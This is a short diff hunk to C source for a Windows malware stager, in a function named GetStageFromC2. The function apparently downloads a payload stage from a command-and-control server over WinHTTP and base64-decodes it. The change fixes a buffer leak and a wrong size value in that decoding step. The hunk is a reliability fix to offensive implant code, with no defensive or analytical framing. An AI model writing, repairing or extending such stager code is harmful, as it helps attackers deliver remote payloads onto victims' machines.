@@ -160,21 +160,20 @@ CHAR* GetStageFromC2(DWORD* sSize)
     }
 
     // setup our base64 decode
-    size_t out_len   = strlen(ResBuffer) + 1;
-    size_t b64_len   = b64_decoded_size(ResBuffer);
-    char*  b64_out   = (char*)malloc(out_len);
 
-    // decode the data
-    b64_out = base64_decode((const char*)ResBuffer, out_len - 1, &out_len);
+    size_t len   = strlen(ResBuffer);
+    size_t out_len = 0;
+
+    unsigned char *out_buffer = base64_decode((const unsigned char *)ResBuffer, len, &out_len);
 
     // give the values back
-    *sSize = b64_len;
+    *sSize = out_len;
 
     // clean up the handles
     rWinHttpCloseHandle(hRequest);
     rWinHttpCloseHandle(hSession);
     rWinHttpCloseHandle(hConnect);
 
-    return b64_out;
+    return (char *)out_buffer;
 
 }
